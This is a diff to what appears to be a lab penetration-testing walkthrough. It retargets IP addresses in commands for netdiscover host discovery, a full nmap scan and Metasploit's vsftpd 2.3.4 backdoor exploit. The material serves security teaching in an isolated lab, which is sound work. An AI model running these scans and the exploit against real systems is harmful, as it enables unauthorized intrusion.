@@ -68,7 +68,7 @@ This phase shows how real attackers gather intel before attacking.
 
 ### 1.1 Discover Target IP
 ```bash
-sudo netdiscover -r 192.168.1.0/24
+sudo netdiscover -r 192.168.56.0/24
 ```
 
 - Scans your local network range and discovers all active hosts
@@ -76,7 +76,7 @@ sudo netdiscover -r 192.168.1.0/24
 
 ### 1.2 Full Nmap Scan
 ```bash
-nmap -A -T4 -p- 192.168.1.105 -oN nmap-scan.txt
+nmap -A -T4 -p- 192.168.56.5 -oN nmap-scan.txt
 ```
 
 | Flag | Description |
@@ -129,7 +129,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 
 ### 3.4 Set the target and run
 ```bash
-set RHOSTS 192.168.1.105
+set RHOSTS 192.168.56.5
 set RPORT 21
 run
 ```
